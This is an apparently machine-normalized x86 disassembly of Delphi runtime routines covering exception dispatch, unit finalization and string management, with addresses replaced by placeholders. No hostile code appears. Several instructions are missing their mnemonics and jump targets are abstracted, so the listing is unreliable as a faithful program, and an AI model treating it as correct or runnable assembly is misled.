push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f84
sub_4039f4
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405cfc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403258
call sub_4035dc
sub_403a48
call sub_405cfc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403258
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036a4
jmp edx
sub_403a90
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403bf0
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c5e
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cbe
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d18
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405a90
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d3c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405a90
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d64
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d88
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403de4
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e14
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ea0
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d88
call sub_403e14
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c18
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bf0
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40555c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403de4
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f90
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403fb4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403fe4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404054
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404028
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404054
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404080
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404054
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f90
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_4040b0
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040d0
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4040ec
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f90
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045dc
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040b0
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4040b0
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045dc
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404080
jmp r-xdata
sub_404188
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404080
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041b8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040ec
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404200
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404080
not ecx
sub_40422c
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404258
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fe4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045dc
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045dc
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_40429c
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fe4
test ecx ecx
je sub_403fe4
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404258
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404054
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fe4
pop edx
pop eax
jmp sub_404258
call sub_403fe4
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404310
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404054
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045dc
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fe4
dec [ edx - 0x8 ]
sub_40439c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_40445c
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404054
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_4044b0
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f90
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404080
jmp r-xdata
pop ebx
retn 0x4
sub_4044f0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_40445c#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045dc
mov edi ecx
sub_404538
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045dc
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404594
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045dc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f90
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404054
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404688
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046ac
test edx edx
je sub_404670
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404670
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_4046d0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404670
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048b8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040d0
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040d0
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048b8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40475c
jmp r-xdata
sub_40475c
test ecx ecx
je sub_404670
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404780
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40475c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047e8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_40486c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047dc
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40475c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048b8
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404660
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404648
mov ebx eax
mov eax [ edi ]
call sub_4047dc
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_4048fc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_40492c
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_40492c
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_40492c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048fc
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_4049c0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a0c
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a0c
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fb4
jmp r-xdata
call sub_403f90
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404688
jmp r-xdata
call sub_404670
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049f4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a0c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049c0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4055cc
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404f20
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404b1c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403fe4
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046ac
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b04
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c38
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b1c
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4055e4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404f5c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c38
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403fe4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046ac
add ebx 0x4
